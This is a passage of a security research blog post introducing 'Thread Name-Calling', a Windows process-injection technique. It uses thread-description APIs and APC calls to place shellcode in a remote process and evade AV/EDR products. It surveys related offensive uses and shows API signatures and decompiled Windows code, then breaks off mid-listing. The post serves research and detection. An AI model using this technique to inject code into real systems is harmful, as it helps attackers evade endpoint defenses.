# https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/

<!DOCTYPE html><html lang="en-US">
<body class="wp-singular post-template-default single single-post postid-30223 single-format-standard wp-theme-research-th">
 

 

<div class="container container-wide">
	<div class="mobile-categories-nav">
		<div class="sidebar-post-categories">
	<div class="text font-blue">
			<h2>CATEGORIES</h2>
		</div>
					<ul class="post-category">
			 
			<li> 
				<a href="https://research.checkpoint.com/category/android-malware/">
					<input type="checkbox" id="10457" class="cat-filter" value="10457">
					<label for="10457"> Android Malware</label>
					<span>23</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/artificial-intelligence-2/">
					<input type="checkbox" id="10621" class="cat-filter" value="10621">
					<label for="10621"> Artificial Intelligence</label>
					<span>4</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/chatgpt/">
					<input type="checkbox" id="10637" class="cat-filter" value="10637">
					<label for="10637"> ChatGPT</label>
					<span>3</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-research/">
					<input type="checkbox" id="10441" class="cat-filter" value="10441">
					<label for="10441"> Check Point Research Publications</label>
					<span>443</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/cloud-security/">
					<input type="checkbox" id="10634" class="cat-filter" value="10634">
					<label for="10634"> Cloud Security</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/cpradio/">
					<input type="checkbox" id="10539" class="cat-filter" value="10539">
					<label for="10539"> CPRadio</label>
					<span>44</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/crypto/">
					<input type="checkbox" id="10655" class="cat-filter" value="10655">
					<label for="10655"> Crypto</label>
					<span>2</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/data-threat-intelligence/">
					<input type="checkbox" id="10643" class="cat-filter" value="10643">
					<label for="10643"> Data &amp; Threat Intelligence</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/data-analysis/">
					<input type="checkbox" id="10645" class="cat-filter" value="10645">
					<label for="10645"> Data Analysis</label>
					<span>0</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/demos/">
					<input type="checkbox" id="10062" class="cat-filter" value="10062">
					<label for="10062"> Demos</label>
					<span>22</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-intelligence-reports/">
					<input type="checkbox" id="10060" class="cat-filter" value="10060">
					<label for="10060"> Global Cyber Attack Reports</label>
					<span>395</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/how-to-guides/">
					<input type="checkbox" id="10475" class="cat-filter" value="10475">
					<label for="10475"> How To Guides</label>
					<span>13</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/ransomware/">
					<input type="checkbox" id="10622" class="cat-filter" value="10622">
					<label for="10622"> Ransomware</label>
					<span>3</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/russo-ukrainian-war/">
					<input type="checkbox" id="10624" class="cat-filter" value="10624">
					<label for="10624"> Russo-Ukrainian War</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/security-report/">
					<input type="checkbox" id="10656" class="cat-filter" value="10656">
					<label for="10656"> Security Report</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-and-data-analysis/">
					<input type="checkbox" id="10644" class="cat-filter" value="10644">
					<label for="10644"> Threat and data analysis</label>
					<span>0</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-research-2/">
					<input type="checkbox" id="10458" class="cat-filter" value="10458">
					<label for="10458"> Threat Research</label>
					<span>173</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/web3/">
					<input type="checkbox" id="10653" class="cat-filter" value="10653">
					<label for="10653"> Web 3.0 Security</label>
					<span>11</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/wipers/">
					<input type="checkbox" id="10623" class="cat-filter" value="10623">
					<label for="10623"> Wipers</label>
					<span>0</span>
				</a>	
			</li>
					</ul>
		</div>

	</div>
</div>
<section id="single-post" class="blog-post-wrapper single-blog-wrapper section-padding background-blue ">
	<div class="container container-wide">
		
		<div class="flex-row align-items-start">
			<div class="flex-8 font-white">
				<div class="blog-post-wrap">
					<div class="flex-row">
						<div class="flex-12">
														<div class="image">
								<img src="https://research.checkpoint.com/wp-content/uploads/2024/07/TXYQKLGPF9-rId20.png" alt="">
							</div>
													</div>
						<div class="flex-9">
							<div class="text">
								<h1 class="h3">Thread Name-Calling – using Thread Name for offense</h1>
								<div class="date">
									<svg xmlns="http://www.w3.org/2000/svg" width="14.012" height="14.012" viewBox="0 0 14.012 14.012"><path id="Path_149" data-name="Path 149" d="M1.752,4.379v7.882H12.261V4.379Zm9.634-2.627h1.752a.827.827,0,0,1,.876.876V13.137a.827.827,0,0,1-.876.876H.876A.827.827,0,0,1,0,13.137V2.627a.827.827,0,0,1,.876-.876H2.627V.876A.827.827,0,0,1,3.5,0a.827.827,0,0,1,.876.876v.876H9.634V.876a.876.876,0,1,1,1.752,0Zm-.876,8.758H8.758V8.758h1.752Zm-2.627,0H6.13V8.758H7.882Zm2.627-2.627H8.758V6.13h1.752Zm-2.627,0H6.13V6.13H7.882ZM5.255,10.509H3.5V8.758H5.255Z" fill="#fff" fill-rule="evenodd"></path></svg>									
									July 25, 2024								</div>
							</div>
						</div>
						<div class="flex-3">
							<div class="social-button">
		<div class="icon-sharing-links">
			<a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/%20-%20%20https://research.checkpoint.com/?p=30223;source=LinkedIn" title="Share on LinkedIn!"><svg style="fill: currentColor;" id="Group_185773" data-name="Group 185773" xmlns="http://www.w3.org/2000/svg" width="15.863" height="15.697" viewBox="0 0 15.863 15.697"><path id="Path_28" data-name="Path 28" d="M41.342,107.835H38.107V97.622c2.039-.532,2.921-.341,3.249.629a10.413,10.413,0,0,1,2.275-1.038c2.6-.5,4.128.657,4.565,3.306a7.793,7.793,0,0,1,.128,1.212c.014,1.986.006,3.973.006,6.07H45.04c0-1.073,0-2.147,0-3.22,0-.724.016-1.449-.015-2.173-.075-1.7-.606-2.4-1.771-2.4-1.211.006-1.861.8-1.9,2.469C41.31,104.241,41.342,106,41.342,107.835Z" transform="translate(-32.47 -92.138)" fill="currentColor"></path><path id="Path_29" data-name="Path 29" d="M31.482,97.555h3.156v10.359H31.482Z" transform="translate(-31.164 -92.228)" fill="currentColor"></path> <path id="Path_30" data-name="Path 30" d="M32.993,94.694a1.862,1.862,0,0,1-1.907-1.862,1.891,1.891,0,0,1,1.88-1.912,1.867,1.867,0,0,1,1.889,1.885A1.816,1.816,0,0,1,32.993,94.694Z" transform="translate(-31.086 -90.92)" fill="currentColor"></path></svg></a>
			
			<a target="blank" href="http://www.facebook.com/sharer.php?u=https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/%20-%20https://research.checkpoint.com/?p=30223" title="Share on Facebook!"><svg style="fill: currentColor;" id="WKND-icon" xmlns="http://www.w3.org/2000/svg" width="14.347" height="14.347" viewBox="0 0 14.347 14.347"><rect id="background" width="14.347" height="14.347" transform="translate(0 0)" fill="transparent"></rect><g id="Dribbble-Light-Preview" transform="translate(3.966 0.077)"><g id="icons"><path id="facebook-_176_" data-name="facebook-[#176]" d="M333.867,7253.27v-6.422h1.95l.318-2.854h-2.268V7242.6c0-.735.019-1.465,1.046-1.465h1.04V7239.1a11.584,11.584,0,0,0-1.8-.1c-1.888,0-3.07,1.183-3.07,3.354v1.641H329v2.854h2.086v6.422Z" transform="translate(-329 -7239)" fill="currentColor" fill-rule="evenodd"></path> </g></g></svg></a>
			
			<a target="blank" href="http://twitter.com/home/?status=Thread%20Name-Calling%20%E2%80%93%20using%20Thread%20Name%20for%20offense%20-%20https://research.checkpoint.com/?p=30223%20via%20@kenmata" title="Tweet this!"><svg style="fill: currentColor;" id="WKND-icon" xmlns="http://www.w3.org/2000/svg" width="14.515" height="14.347" viewBox="0 0 14.515 14.347"><rect id="background" width="14.347" height="14.347" transform="translate(0 0)" fill="transparent"></rect><g id="Dribbble-Light-Preview" transform="translate(0.245 1.504)"><g id="icons"><path id="twitter-_154_" data-name="twitter-[#154]" d="M8.488,7372.416a8.206,8.206,0,0,0,8.33-8.2c0-.125,0-.25-.009-.373a5.9,5.9,0,0,0,1.461-1.492,5.926,5.926,0,0,1-1.681.453,2.9,2.9,0,0,0,1.287-1.595,5.9,5.9,0,0,1-1.859.7,2.964,2.964,0,0,0-4.143-.125,2.858,2.858,0,0,0-.847,2.754,8.364,8.364,0,0,1-6.034-3.011,2.857,2.857,0,0,0,.907,3.847,2.942,2.942,0,0,1-1.329-.36v.036a2.9,2.9,0,0,0,2.349,2.825,2.954,2.954,0,0,1-1.321.049,2.924,2.924,0,0,0,2.735,2,5.929,5.929,0,0,1-3.636,1.236,5.847,5.847,0,0,1-.7-.041,8.379,8.379,0,0,0,4.488,1.292" transform="translate(-4 -7361)" fill="currentColor" fill-rule="evenodd"></path></g></g></svg></a>
		
			<a title="Copy this!"><svg style="fill: currentColor;" xmlns="http://www.w3.org/2000/svg" width="18.7" height="18.7" viewBox="0 0 18.7 18.7"><g id="Group_185774" data-name="Group 185774" transform="translate(-591.15 -798.097)"><g id="copy" transform="translate(592 798.947)"><rect id="Rectangle_147602" data-name="Rectangle 147602" width="11" height="11" rx="2" transform="translate(6 6)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.7"></rect><path id="Path_83125" data-name="Path 83125" d="M4.542,13.016H3.695A1.7,1.7,0,0,1,2,11.321V3.695A1.7,1.7,0,0,1,3.695,2h7.626a1.7,1.7,0,0,1,1.695,1.695v.847" transform="translate(-2 -2)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.7"></path></g></g></svg></a>
			<div id="30223" style="display: none;">https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/</div>
		
		</div>
		<div class="icon-sharing"></div>	
</div>						</div>
					</div>
										
					<div class="text border-bottom">
						
<p class="wp-block-paragraph"><strong>Research by:</strong> hasherezade</p>



<h2 class="wp-block-heading">Highlights:</h2>



<ul class="wp-block-list">
<li><em><strong>Process Injection is one of the important techniques in the attackers’ toolkit.</strong></em></li>



<li><em><strong>In the following write-up, Check Point Research (CPR) explains how the API for thread descriptions can be abused to bypass endpoint protection products.</strong></em></li>



<li><em><strong>We propose a new injection technique: Thread Name-Calling, and offer the advisory related to implementing protection.</strong></em></li>
</ul>



<h2 class="wp-block-heading" id="introduction">Introduction</h2>



<p class="wp-block-paragraph">Process injection is one of the&nbsp;<a href="https://attack.mitre.org/techniques/T1055/">important techniques used by attackers</a>. We can find its variants implemented in almost every malware. It serves purposes such as:</p>



<ul class="wp-block-list">
<li><a href="https://attack.mitre.org/tactics/TA0005/">defense evasion</a>: hiding malicious modules under the cover of a different process</li>



<li>interference in the existing process: reading its memory, hooking the used API, etc.</li>



<li><a href="https://attack.mitre.org/tactics/TA0004/">privilege escalation</a></li>
</ul>



<p class="wp-block-paragraph">Due to the fact that interference in the memory of a process by malicious modules can cause a lot of damage, all sorts of AV and EDR products monitor such behaviors and try to prevent them. However, this monitoring is based on the knowledge about the common APIs used in implementations of the injection methods. This cat-and-mouse game never ends. Cybercriminals, as well as&nbsp;<a href="https://en.wikipedia.org/wiki/Red_team">red teamers</a>, keep trying to break the known patterns, by using some atypical APIs, and thanks to this, to evade the detection implemented at the time. One example of this is the&nbsp;<a href="https://www.fortinet.com/blog/threat-research/atombombing-brand-new-code-injection-technique-for-windows">Atom Bombing technique</a>&nbsp;(from 2016), which uses&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globaladdatoma">the Atom Table</a>&nbsp;to pass the code into the remote process, or the recently introduced&nbsp;<a href="https://www.safebreach.com/blog/process-injection-using-windows-thread-pools">Pool Party</a>&nbsp;(from 2023), where the thread pools were abused to run the code in the context of a different process, without the EDRs noticing it. The diversity of the APIs used has been very well described in the paper&nbsp;<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf">“Windows Process Injection in 2019” by Amit Klein and Itzik Kotler</a>.</p>



<p class="wp-block-paragraph">Thread Name-Calling is yet another take on this topic. It is a technique allowing to implant a shellcode into a running process, using the following Windows APIs:</p>



<ul class="wp-block-list">
<li><code>GetThreadDescription</code>/&nbsp;<code>SetThreadDescription</code>&nbsp;(introduced in Windows 10, 1607) – an API for setting and retrieving the thread description (a.k.a. thread name)</li>



<li><code>ZwQueueApcThreadEx2</code>&nbsp;(introduced in Windows 10, 19045) – a new API for&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">Asynchronous Procedure Calls (APC)</a></li>
</ul>



<p class="wp-block-paragraph">The remote memory allocation, and writing to it, is achieved on the process using a handle without the write access (<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights"><code>PROCESS_VM_WRITE</code></a><strong>)</strong>. Thanks to this feature, and also due to the fact that the APIs we used are not commonly associated with process injection, we were able to bypass some of the major AV and EDR products. In this blog we elaborate on the implementation details of this new technique and suggest some possible detection methods.</p>



<h2 class="wp-block-heading" id="thread-name-in-offensive-use-cases">Thread Name in offensive use-cases</h2>



<p class="wp-block-paragraph">Before we begin, note that the involved functions are relatively new, and are not used in any well-established injection methods. However, they are not “brand new” – they have been added a few years ago, so naturally we are not the first ones to research about their potential for offensive scenarios. Some of the related uses were discussed on X/Twitter (we found a question by&nbsp;<a href="https://x.com/Hexacorn/status/1317424213951733761">Adam “Hexacorn” from 2020</a>, and by&nbsp;<a href="https://x.com/_Gal_Yaniv/status/1353630677493837825">Gal Yaniv from 2021</a>&nbsp;referencing those APIs). We tried to collect the various use-cases to the best of our abilities, and list the related PoCs.</p>



<p class="wp-block-paragraph">Get/SetThreadDescription may be utilized in:</p>



<ul class="wp-block-list">
<li>undocumented IPC: a thread name is used as a “mailbox” via which two processes are exchanging messages. The sender process can pass information to a receiver process by setting a description on one of its threads. The receiver reads the description from the thread and process it further.
<ul class="wp-block-list">
<li>implementation:&nbsp;<a href="https://github.com/LloydLabs/dearg-thread-ipc-stealth">https://github.com/LloydLabs/dearg-thread-ipc-stealth</a></li>
</ul>
</li>



<li>hiding inactive code implant from a memory scan. This idea is similar to&nbsp;<a href="https://github.com/mgeeky/ShellcodeFluctuation">ShellcodeFluctuation</a>, but instead of / in addition to encryption, we temporarily store the code as a thread name (which is a kernel mode structure), out of the working set – that means, out of sight of the user mode memory scanners. It will be repeatedly retrieved into the working set, executed for a small time slot, then stored again as the thread name.
<ul class="wp-block-list">
<li>implementation:&nbsp;<a href="https://gitlab.com/ORCA000/t.d.p">ORCA / T.D.P · GitLab</a></li>
</ul>
</li>



<li>allocating memory in the kernel mode from user mode so that it can be further used in scenarios related to kernel mode exploitation
<ul class="wp-block-list">
<li>implementation:&nbsp;<a href="https://web.archive.org/web/20221009194014/https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html">Small dumps in the big pool (blahcat.github.io)</a></li>
</ul>
</li>



<li>remote code injection
<ul class="wp-block-list">
<li>“DoubleBarrel” – by Sam Russel, 2022 :&nbsp;<a href="https://www.lodsb.com/shellcode-injection-using-threadnameinformation">https://www.lodsb.com/shellcode-injection-using-threadnameinformation</a>&nbsp;: injects code using a variant of&nbsp;<a href="https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking">thread hijacking</a>, redirecting the thread execution to the <a href="https://ctf101.org/binary-exploitation/return-oriented-programming/">ROP</a> chain that is facilitated by a content passed via the thread name. This technique does not create additional executable memory space – that gives it a potential to evade some detections. The downsides are the limitations imposed on the shellcode (it must be a handcrafted <a href="https://ctf101.org/binary-exploitation/return-oriented-programming/">ROP</a> chain, containing gadgets specific to the particular version of Windows), and the possible instability of the target application after the shellcode execution. Also, use of the API for direct thread manipulation is prone to trigger alerts.</li>



<li>“Thread Name-Calling injection” – the technique introduced in this article. The code to be injected is passed as a thread description to the target. Next, the function&nbsp;<code>GetThreadDescription</code>&nbsp;is called remotely on the target, via&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">APC</a>, causing the description buffer to be copied into the target’s&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-working-set">working set</a>. After making the buffer executable, it is run using another&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">APC</a>&nbsp;call. It supports any custom shellcode. This technique does not corrupt the original thread: the target application seamlessly continues its execution.</li>
</ul>
</li>



<li>DLL injection variant: typically for this technique, we write a path to our DLL into the address space of the target, and then remotely call&nbsp;<code>LoadLibrary</code>&nbsp;to get the DLL loaded within the target. In contrast to the&nbsp;<a href="https://attack.mitre.org/techniques/T1055/001/">classic implementation</a>&nbsp;that uses&nbsp;<code>VirtualAllocEx</code>&nbsp;and&nbsp;<code>WriteProcessMemory</code>, here the path of the DLL is passed via thread name (remote write achieved as in the Thread Name-Calling).
<ul class="wp-block-list">
<li>This technique is described in the “Bonus” section of this article.</li>
</ul>
</li>
</ul>



<h2 class="wp-block-heading" id="the-apis-used">The APIs Used</h2>



<p class="wp-block-paragraph">Lets start by looking at the APIs that are vital for the introduced technique. Understanding the details of their implementation is crucial for explaining the further abuse.</p>



<h3 class="wp-block-heading" id="getthreaddescription-setthreaddescription">GetThreadDescription / SetThreadDescription</h3>



<p class="wp-block-paragraph">Since Windows 10, 1607 the following functions were added to the Windows API:</p>



<p class="wp-block-paragraph"><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreaddescription">GetThreadDescription</a></p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">HRESULT </span><span class="enlighter-m0">GetThreadDescription</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"> </span><span class="enlighter-g1">[</span><span class="enlighter-text">in</span><span class="enlighter-g1">]</span><span class="enlighter-text"> HANDLE hThread,</span></div></div><div class=""><div><span class="enlighter-text"> </span><span class="enlighter-g1">[</span><span class="enlighter-text">out</span><span class="enlighter-g1">]</span><span class="enlighter-text"> PWSTR *ppszThreadDescription </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">HRESULT GetThreadDescription(
 [in] HANDLE hThread,
 [out] PWSTR *ppszThreadDescription 
);</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">HRESULT GetThreadDescription(
 [in] HANDLE hThread,
 [out] PWSTR *ppszThreadDescription 
);</pre>



<p class="wp-block-paragraph"><a href="https://learn.microsoft.com/pl-pl/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreaddescription">SetThreadDescription</a></p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">HRESULT </span><span class="enlighter-m0">SetThreadDescription</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"> </span><span class="enlighter-g1">[</span><span class="enlighter-text">in</span><span class="enlighter-g1">]</span><span class="enlighter-text"> HANDLE hThread,</span></div></div><div class=""><div><span class="enlighter-text"> </span><span class="enlighter-g1">[</span><span class="enlighter-text">in</span><span class="enlighter-g1">]</span><span class="enlighter-text"> PCWSTR lpThreadDescription </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">HRESULT SetThreadDescription(
 [in] HANDLE hThread,
 [in] PCWSTR lpThreadDescription 
);</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">HRESULT SetThreadDescription(
 [in] HANDLE hThread,
 [in] PCWSTR lpThreadDescription 
);</pre>



<p class="wp-block-paragraph">Their expected usage is related to setting the description (name) of a thread. That enables us to identify its functionality, and can help i.e.&nbsp;in debugging. However, if we look at this API with an offensive mindset, we can quickly see some potential for misuse.</p>



<p class="wp-block-paragraph">To set the name, we need to open a handle to the thread with the access flag&nbsp;<code>THREAD_SET_LIMITED_INFORMATION</code>. Under this minimal requirement, we can attach our arbitrary buffer to any thread of a remote process.</p>



<p class="wp-block-paragraph">The buffer must be a Unicode string, which basically means, any buffer terminated by a&nbsp;<code>L'\0'</code>(double NULL byte). The size that we can allocate is pretty generous: <a href="https://web.archive.org/web/20221009194014/https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html"><code>0x10000</code>&nbsp;bytes</a>&nbsp; – of which, according to experiments, we can use <code>(0x10000 - 2)</code> for our data buffer (including the terminator). This is an equivalent of almost 16 pages of data, which is well enough to store a block of shellcode…</p>



<h3 class="wp-block-heading" id="api-implementation">API Implementation</h3>



<p class="wp-block-paragraph">The described functions are implemented in&nbsp;<code>Kernelbase.dll</code>.</p>



<ol class="wp-block-list">
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreaddescription">SetThreadDescription</a>:</li>
</ol>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k4">#define ThreadNameInformation 0x26</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">HRESULT __stdcall </span><span class="enlighter-m0">SetThreadDescription</span><span class="enlighter-g1">(</span><span class="enlighter-text">HANDLE hThread, PCWSTR lpThreadDescription</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  NTSTATUS status; </span><span class="enlighter-c0">// eax</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> _UNICODE_STRING DestinationString;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  status = </span><span class="enlighter-m0">RtlInitUnicodeStringEx</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;DestinationString, lpThreadDescription</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> status </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">= 0 </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    status = </span><span class="enlighter-m0">NtSetInformationThread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread, ThreadNameInformation, &amp;DestinationString, 0x10u</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k0">return</span><span class="enlighter-text"> status | </span><span class="enlighter-n2">0x10000000</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">#define ThreadNameInformation 0x26

HRESULT __stdcall SetThreadDescription(HANDLE hThread, PCWSTR lpThreadDescription)
{
  NTSTATUS status; // eax
  struct _UNICODE_STRING DestinationString;

  status = RtlInitUnicodeStringEx(&amp;DestinationString, lpThreadDescription);
  if ( status &gt;= 0 )
    status = NtSetInformationThread(hThread, ThreadNameInformation, &amp;DestinationString, 0x10u);
  return status | 0x10000000;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#define ThreadNameInformation 0x26

HRESULT __stdcall SetThreadDescription(HANDLE hThread, PCWSTR lpThreadDescription)
{
  NTSTATUS status; // eax
  struct _UNICODE_STRING DestinationString;

  status = RtlInitUnicodeStringEx(&amp;DestinationString, lpThreadDescription);
  if ( status &gt;= 0 )
    status = NtSetInformationThread(hThread, ThreadNameInformation, &amp;DestinationString, 0x10u);
  return status | 0x10000000;
}</pre>



<p class="wp-block-paragraph">This function expects us to pass a Unicode string buffer (<code>WCHAR*</code>), from which it creates a&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string">UNICODE_STRING</a>&nbsp;structure, that is passed further. Looking at the implementation, we can see that the setting of the string onto the thread is implemented by&nbsp;<code>NtSetInformationThread</code>. The returned value is a result of the aforementioned low-level API&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/winerror/nf-winerror-hresult_from_nt">converted from NTSTATUS to HRESULT, by setting&nbsp;<code>FACILITY_NT_BIT</code></a>&nbsp;(&nbsp;<a href="https://doxygen.reactos.org/d4/ded/winerror_8h.html#a13eeae83428d978094fe05850465dfcf"><code>0x10000000</code></a>&nbsp;).</p>



<p class="wp-block-paragraph">In our implementation of a remote write, we start by calling&nbsp;<code>SetThreadDescription</code>&nbsp;on a remote thread, making it hold our buffer.</p>



<ol start="2" class="wp-block-list">
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreaddescription">GetThreadDescription</a>:</li>
</ol>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">HRESULT __stdcall </span><span class="enlighter-m0">GetThreadDescription</span><span class="enlighter-g1">(</span><span class="enlighter-text">HANDLE hThread, PWSTR *ppszThreadDescription</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  SIZE_T struct_len; </span><span class="enlighter-c0">// rbx</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  SIZE_T struct_size; </span><span class="enlighter-c0">// r8</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  NTSTATUS res; </span><span class="enlighter-c0">// eax</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  NTSTATUS status; </span><span class="enlighter-c0">// ebx</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k8">const</span><span class="enlighter-text"> UNICODE_STRING *struct_buf; </span><span class="enlighter-c0">// rdi</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  ULONG ReturnLength; </span><span class="enlighter-c0">// [rsp+58h] [rbp+10h] BYREF</span><span class="enlighter-text"></span></div></div><div class=""><div><span 